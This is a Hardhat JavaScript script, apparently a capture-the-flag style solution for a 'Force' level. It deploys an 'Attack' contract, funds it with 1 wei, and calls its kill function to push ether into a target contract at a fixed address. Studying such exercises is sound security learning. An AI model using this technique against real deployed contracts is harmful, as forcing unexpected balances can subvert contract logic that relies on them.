const { ethers } = require("hardhat");
const Runner = require("./lib/runner");

Runner.run(async (provider, owner) => {
  const forceAddr = "0x4ca3B961223B02be32D448D642e9C389628Cf18B";

  const forceContract = await ethers.getContractAt("Force", forceAddr);

  const attackContract = await ethers.getContractFactory("Attack");
  const attack = await attackContract.deploy();
  await attack.deployed();
  console.log(`attack deployed at ${attack.address}`);

  const hackContract = await ethers.getContractAt("Attack", attack.address);

  const tx = await owner.sendTransaction({
    to: hackContract.address,
    value: 1,
    gasLimit: 100000,
  });
  console.log(tx.hash);
  await tx.wait();
  console.log("tx complete");
  console.log(`balance is ${await hackContract.getBalance()}`);

  const tx2 = await hackContract.kill(forceContract.address);
  console.log(tx2.hash);
  await tx2.wait();
  console.log("tx2 complete");

  console.log(
    `balance of force contract is: ${await provider.getBalance(
      forceContract.address
    )}`
  );
});
